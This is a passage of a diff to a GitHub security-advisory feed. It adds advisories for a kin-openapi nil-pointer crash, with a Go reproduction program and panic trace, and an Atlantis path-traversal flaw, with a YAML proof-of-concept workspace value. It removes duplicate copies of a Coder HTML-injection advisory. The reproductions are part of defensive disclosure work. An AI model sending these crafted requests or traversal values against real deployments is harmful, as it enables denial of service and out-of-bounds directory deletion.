+`
+
+func main() {
+    loader := openapi3.NewLoader()
+    doc, _ := loader.LoadFromData([]byte(spec))
+    _ = doc.Validate(loader.Context)
+    router, _ := gorillamux.NewRouter(doc)
+
+    // multipart body: a non-numeric value for the integer property "age"
+    var buf bytes.Buffer
+    w := multipart.NewWriter(&amp;buf)
+    _ = w.WriteField("age", "notanumber")
+    w.Close()
+
+    r, _ := http.NewRequest(http.MethodPost, "/upload", &amp;buf)
+    r.Header.Set("Content-Type", w.FormDataContentType())
+    route, pp, _ := router.FindRoute(r)
+
+    reqErr := openapi3filter.ValidateRequest(context.Background(), &amp;openapi3filter.RequestValidationInput{
+        Request: r, PathParams: pp, Route: route,
+        Options: &amp;openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
+    })
+    fmt.Printf("ValidateRequest returned: %T\n", reqErr) // *openapi3filter.RequestError
+
+    // What an application's error-rendering middleware calls:
+    _ = openapi3filter.ConvertErrors(reqErr) // panics
+    fmt.Println("no panic (unexpected)")
+}
+</code></pre>
+<p><strong>3. Observed output</strong> (<code>go run .</code>):</p>
+<pre><code>ValidateRequest returned: *openapi3filter.RequestError
+panic: runtime error: invalid memory address or nil pointer dereference
+[signal SIGSEGV: segmentation violation code=0x2 addr=0x20 pc=0x...]
+
+goroutine 1 [running]:
+github.com/getkin/kin-openapi/openapi3filter.convertParseError(...)
+    .../openapi3filter/validation_error_encoder.go:120 +0x17c
+github.com/getkin/kin-openapi/openapi3filter.ConvertErrors(...)
+    .../openapi3filter/validation_error_encoder.go:42 +0xec
+main.main()
+    ...
+exit status 2
+</code></pre>
+<p>The panic is at exactly <code>validation_error_encoder.go:120</code> — the unguarded <code>e.Parameter.In</code> dereference.</p>
+<p><strong>Control (confirms JSON is not a vector):</strong> repeating the setup with an <code>application/json</code> body and either a malformed body (<code>{"age": </code>) or a wrong-type body (<code>{"age": "notanumber"}</code>) returns from <code>ConvertErrors</code> normally, with no panic. Only the <code>multipart/form-data</code> path crashes.</p>
+<p>In a real HTTP server, <code>ConvertErrors</code> / <code>ValidationErrorEncoder.Encode</code> runs inside the request handler, so the panic aborts the in-flight request (connection reset / 500) and, without a <code>recover()</code> in the middleware chain, is trivially repeatable.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Type:</strong> Nil-pointer dereference → <strong>unauthenticated remote denial of service</strong>.</li>
+<li><strong>Who is impacted:</strong> any application using <code>github.com/getkin/kin-openapi/openapi3filter</code> that (1) exposes an endpoint accepting a <code>multipart/form-data</code> request body with at least one non-string scalar property (<code>integer</code> / <code>number</code> / <code>boolean</code>), <strong>and</strong> (2) renders validation errors through the library's own <code>ValidationErrorEncoder</code> or <code>ConvertErrors</code> helpers. These are the library's advertised error-rendering helpers, so this is a realistic default integration.</li>
+<li><strong>Attack:</strong> a single crafted, unauthenticated request (a multipart part whose value doesn't parse to the declared scalar type). No credentials, special privileges, or unusual client capabilities are required, and it is repeatable at will.</li>
+<li><strong>Consequence:</strong> the handling goroutine panics. Absent a <code>recover()</code> boundary in the application's middleware, the request is aborted; sustained requests deny service. Confidentiality and integrity are not affected.</li>
+<li><strong>Not affected:</strong> applications that only accept <code>application/json</code> bodies (verified above), applications that do not use <code>ConvertErrors</code> / <code>ValidationErrorEncoder</code> to format errors, or applications that wrap handlers in a <code>recover()</code> (which converts the crash into a handled 500 but still prevents normal error rendering).</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/getkin/kin-openapi/security/advisories/GHSA-mmfr-pmjx-hw9w">https://github.com/getkin/kin-openapi/security/advisories/GHSA-mmfr-pmjx-hw9w</a></li>
+<li><a href="https://github.com/getkin/kin-openapi/commit/1d0a337c9b1570fab283be8a04c8af6e43b9a22c">https://github.com/getkin/kin-openapi/commit/1d0a337c9b1570fab283be8a04c8af6e43b9a22c</a></li>
+<li><a href="https://github.com/getkin/kin-openapi/releases/tag/v0.141.0">https://github.com/getkin/kin-openapi/releases/tag/v0.141.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-mmfr-pmjx-hw9w">https://github.com/advisories/GHSA-mmfr-pmjx-hw9w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mmfr-pmjx-hw9w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-21T20:55:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/runatlantis/atlantis] Atlantis Workspace Handling has Path Traversal that Allows Out-of-Bounds Directory Deletion/Creation]]></title>
+        <id>https://github.com/advisories/GHSA-26w5-6g95-gj28</id>
+        <link href="https://github.com/advisories/GHSA-26w5-6g95-gj28"/>
+        <updated>2026-08-21T20:55:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Atlantis versions <code>&gt;= 0.19.8</code> and <code>&lt; 0.45.0</code> did not consistently validate user-controlled <code>workspace</code> values before using them to construct local workspace paths.</p>
+<p>A crafted workspace value containing path traversal segments could cause Atlantis to resolve workspace paths outside the intended per-pull workspace directory. In vulnerable versions or code paths, Atlantis could create, use, or remove/recreate out-of-bounds directories with the privileges of the Atlantis process user, before Terraform rejected the invalid workspace name.</p>
+<p>The issue is fixed in Atlantis <code>0.45.0</code>.</p>
+<h3 id="details">Details</h3>
+<p>The issue is a path traversal vulnerability in Atlantis workspace handling. <code>workspace</code> values can be supplied through repository-level <code>atlantis.yaml</code> configuration accepted by the server or through authenticated API input. A value such as <code>../../../../../../../../tmp/f1-canary</code> could escape the intended Atlantis workspace root.</p>
+<p>In affected code paths, Atlantis used the resolved workspace path for local working-directory operations. For example, workspace values were joined into repo pull paths, and clone preparation paths could call directory removal/recreation operations such as <code>os.RemoveAll</code> and <code>os.MkdirAll</code> on the resolved directory.</p>
+<h3 id="poc">PoC</h3>
+<p>In a local PoC using repo-level <code>atlantis.yaml</code>, the following workspace value caused Atlantis to resolve and use <code>/tmp/f1-canary</code> outside <code>~/.atlantis/repos/...</code>:</p>
+<pre><code class="language-yaml">version: 3
+projects:
+  - dir: .
+    workspace: ../../../../../../../../tmp/f1-canary
+</code></pre>
+<p>Atlantis logs showed the out-of-bounds directory being created and Terraform being run with <code>/tmp/f1-canary</code> as the working directory. Terraform rejected the workspace name only after Atlantis had already used the out-of-bounds path.</p>
+<h3 id="impact">Impact</h3>
+<p>A user who can cause Atlantis to process a crafted <code>workspace</code> value, for example through repository-level <code>atlantis.yaml</code> configuration accepted by the server or an authenticated <code>/api/plan</code> request, may cause filesystem operations to occur outside the intended workspace boundary.</p>
+<p>Depending on the affected version, code path, deployment configuration, and filesystem permissions, this may result in unintended directory creation, deletion, or reuse, integrity impact to writable local paths, or denial of service. Containerized deployments may limit host impact, but writable mounted volumes and persistent Atlantis data paths remain relevant.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/runatlantis/atlantis/security/advisories/GHSA-26w5-6g95-gj28">https://github.com/runatlantis/atlantis/security/advisories/GHSA-26w5-6g95-gj28</a></li>
+<li><a href="https://github.com/runatlantis/atlantis/pull/6254">https://github.com/runatlantis/atlantis/pull/6254</a></li>
+<li><a href="https://github.com/runatlantis/atlantis/commit/ea4e4ceebf8b387d015fff7ed8a7fcca33279afe">https://github.com/runatlantis/atlantis/commit/ea4e4ceebf8b387d015fff7ed8a7fcca33279afe</a></li>
+<li><a href="https://github.com/runatlantis/atlantis/releases/tag/v0.45.0">https://github.com/runatlantis/atlantis/releases/tag/v0.45.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-26w5-6g95-gj28">https://github.com/advisories/GHSA-26w5-6g95-gj28</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-26w5-6g95-gj28</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-21T20:55:33.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/axllent/mailpit] Mailpit: WebSocket origin check bypass via percent-encoded path (regression of CVE-2026-22689)]]></title>
         <id>https://github.com/advisories/GHSA-8r62-w5wh-fc5m</id>
@@ -781,207 +1511,6 @@ In situations where the server is untrusted or compromised, an attacker could co
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-08-20T18:36:01.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/coder/coder/v2] Coder: Stored HTML injection via unescaped ApplicationName and LogoURL appearance settings]]></title>
-        <id>https://github.com/advisories/GHSA-h58c-xccx-75m3</id>
-        <link href="https://github.com/advisories/GHSA-h58c-xccx-75m3"/>
-        <updated>2026-08-20T18:34:32.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The <code>ApplicationName</code> and <code>LogoURL</code> appearance settings were rendered into HTML output without sufficient escaping which let a highly privileged Owner-role user inject HTML into the Coder dashboard and SMTP notification emails.</p>
-<blockquote>
-<p><strong>Note:</strong> Exploitation requires the <code>Owner</code> role which already holds full administrative control of the deployment so practical impact is limited.</p>
-</blockquote>
-<h3 id="impact">Impact</h3>
-<p>An Owner-role user could store HTML markup in the <code>ApplicationName</code> or <code>LogoURL</code> appearance settings that later rendered in the dashboard and in SMTP notification emails which results in stored HTML injection against other users of the deployment. Exploitation requires the highly privileged <code>Owner</code> role.</p>
-<h3 id="patches">Patches</h3>
-<p>The fix escapes the <code>ApplicationName</code> and <code>LogoURL</code> appearance values in HTML output before rendering.</p>
-<p>The fix was backported to all supported release lines:</p>
-<table>
-<thead>
-<tr>
-<th>Release line</th>
-<th>Patched version</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2.34</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.34.2">v2.34.2</a></td>
-</tr>
-<tr>
-<td>2.33</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.33.8">v2.33.8</a></td>
-</tr>
-<tr>
-<td>2.32</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.32.7">v2.32.7</a></td>
-</tr>
-<tr>
-<td>2.29 (ESR)</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.29.17">v2.29.17</a></td>
-</tr>
-</tbody></table>
-<h3 id="workarounds">Workarounds</h3>
-<p>Restrict the <code>Owner</code> role to trusted administrators.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Fix: #25804</li>
-</ul>
-<h3 id="credits">Credits</h3>
-<p>We'd like to thank Anthropic's Security Team (ANT-2026-22453) for independently disclosing this issue!</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/coder/coder/security/advisories/GHSA-h58c-xccx-75m3">https://github.com/coder/coder/security/advisories/GHSA-h58c-xccx-75m3</a></li>
-<li><a href="https://github.com/coder/coder/pull/25804">https://github.com/coder/coder/pull/25804</a></li>
-<li><a href="https://github.com/coder/coder/commit/ec19bc41d80568c0eb9f74b526e8cc8ffbe3be9a">https://github.com/coder/coder/commit/ec19bc41d80568c0eb9f74b526e8cc8ffbe3be9a</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.29.17">https://github.com/coder/coder/releases/tag/v2.29.17</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.32.7">https://github.com/coder/coder/releases/tag/v2.32.7</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.33.8">https://github.com/coder/coder/releases/tag/v2.33.8</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.34.2">https://github.com/coder/coder/releases/tag/v2.34.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-h58c-xccx-75m3">https://github.com/advisories/GHSA-h58c-xccx-75m3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h58c-xccx-75m3</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-08-20T18:34:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/coder/coder/v2] Coder: Stored HTML injection via unescaped ApplicationName and LogoURL appearance settings]]></title>
-        <id>https://github.com/advisories/GHSA-h58c-xccx-75m3</id>
-        <link href="https://github.com/advisories/GHSA-h58c-xccx-75m3"/>
-        <updated>2026-08-20T18:34:32.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The <code>ApplicationName</code> and <code>LogoURL</code> appearance settings were rendered into HTML output without sufficient escaping which let a highly privileged Owner-role user inject HTML into the Coder dashboard and SMTP notification emails.</p>
-<blockquote>
-<p><strong>Note:</strong> Exploitation requires the <code>Owner</code> role which already holds full administrative control of the deployment so practical impact is limited.</p>
-</blockquote>
-<h3 id="impact">Impact</h3>
-<p>An Owner-role user could store HTML markup in the <code>ApplicationName</code> or <code>LogoURL</code> appearance settings that later rendered in the dashboard and in SMTP notification emails which results in stored HTML injection against other users of the deployment. Exploitation requires the highly privileged <code>Owner</code> role.</p>
-<h3 id="patches">Patches</h3>
-<p>The fix escapes the <code>ApplicationName</code> and <code>LogoURL</code> appearance values in HTML output before rendering.</p>
-<p>The fix was backported to all supported release lines:</p>
-<table>
-<thead>
-<tr>
-<th>Release line</th>
-<th>Patched version</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2.34</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.34.2">v2.34.2</a></td>
-</tr>
-<tr>
-<td>2.33</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.33.8">v2.33.8</a></td>
-</tr>
-<tr>
-<td>2.32</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.32.7">v2.32.7</a></td>
-</tr>
-<tr>
-<td>2.29 (ESR)</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.29.17">v2.29.17</a></td>
-</tr>
-</tbody></table>
-<h3 id="workarounds">Workarounds</h3>
-<p>Restrict the <code>Owner</code> role to trusted administrators.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Fix: #25804</li>
-</ul>
-<h3 id="credits">Credits</h3>
-<p>We'd like to thank Anthropic's Security Team (ANT-2026-22453) for independently disclosing this issue!</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/coder/coder/security/advisories/GHSA-h58c-xccx-75m3">https://github.com/coder/coder/security/advisories/GHSA-h58c-xccx-75m3</a></li>
-<li><a href="https://github.com/coder/coder/pull/25804">https://github.com/coder/coder/pull/25804</a></li>
-<li><a href="https://github.com/coder/coder/commit/ec19bc41d80568c0eb9f74b526e8cc8ffbe3be9a">https://github.com/coder/coder/commit/ec19bc41d80568c0eb9f74b526e8cc8ffbe3be9a</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.29.17">https://github.com/coder/coder/releases/tag/v2.29.17</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.32.7">https://github.com/coder/coder/releases/tag/v2.32.7</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.33.8">https://github.com/coder/coder/releases/tag/v2.33.8</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.34.2">https://github.com/coder/coder/releases/tag/v2.34.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-h58c-xccx-75m3">https://github.com/advisories/GHSA-h58c-xccx-75m3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h58c-xccx-75m3</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-08-20T18:34:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/coder/coder/v2] Coder: Stored HTML injection via unescaped ApplicationName and LogoURL appearance settings]]></title>
-        <id>https://github.com/advisories/GHSA-h58c-xccx-75m3</id>
-        <link href="https://github.com/advisories/GHSA-h58c-xccx-75m3"/>
-        <updated>2026-08-20T18:34:32.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The <code>ApplicationName</code> and <code>LogoURL</code> appearance settings were rendered into HTML output without sufficient escaping which let a highly privileged Owner-role user inject HTML into the Coder dashboard and SMTP notification emails.</p>
-<blockquote>
-<p><strong>Note:</strong> Exploitation requires the <code>Owner</code> role which already holds full administrative control of the deployment so practical impact is limited.</p>
-</blockquote>
-<h3 id="impact">Impact</h3>
-<p>An Owner-role user could store HTML markup in the <code>ApplicationName</code> or <code>LogoURL</code> appearance settings that later rendered in the dashboard and in SMTP notification emails which results in stored HTML injection against other users of the deployment. Exploitation requires the highly privileged <code>Owner</code> role.</p>
-<h3 id="patches">Patches</h3>
-<p>The fix escapes the <code>ApplicationName</code> and <code>LogoURL</code> appearance values in HTML output before rendering.</p>
-<p>The fix was backported to all supported release lines:</p>
-<table>
-<thead>
-<tr>
-<th>Release line</th>
-<th>Patched version</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2.34</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.34.2">v2.34.2</a></td>
-</tr>
-<tr>
-<td>2.33</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.33.8">v2.33.8</a></td>
-</tr>
-<tr>
-<td>2.32</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.32.7">v2.32.7</a></td>
-</tr>
-<tr>
-<td>2.29 (ESR)</td>
-<td><a href="https://github.com/coder/coder/releases/tag/v2.29.17">v2.29.17</a></td>
-</tr>
-</tbody></table>
-<h3 id="workarounds">Workarounds</h3>
-<p>Restrict the <code>Owner</code> role to trusted administrators.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Fix: #25804</li>
-</ul>
-<h3 id="credits">Credits</h3>
-<p>We'd like to thank Anthropic's Security Team (ANT-2026-22453) for independently disclosing this issue!</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/coder/coder/security/advisories/GHSA-h58c-xccx-75m3">https://github.com/coder/coder/security/advisories/GHSA-h58c-xccx-75m3</a></li>
-<li><a href="https://github.com/coder/coder/pull/25804">https://github.com/coder/coder/pull/25804</a></li>
-<li><a href="https://github.com/coder/coder/commit/ec19bc41d80568c0eb9f74b526e8cc8ffbe3be9a">https://github.com/coder/coder/commit/ec19bc41d80568c0eb9f74b526e8cc8ffbe3be9a</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.29.17">https://github.com/coder/coder/releases/tag/v2.29.17</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.32.7">https://github.com/coder/coder/releases/tag/v2.32.7</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.33.8">https://github.com/coder/coder/releases/tag/v2.33.8</a></li>
-<li><a href="https://github.com/coder/coder/releases/tag/v2.34.2">https://github.com/coder/coder/releases/tag/v2.34.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-h58c-xccx-75m3">https://github.com/advisories/GHSA-h58c-xccx-75m3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h58c-xccx-75m3</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-08-20T18:34:26.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/coder/coder/v2] Coder: Stored HTML injection via unescaped ApplicationName and LogoURL appearance settings]]></title>
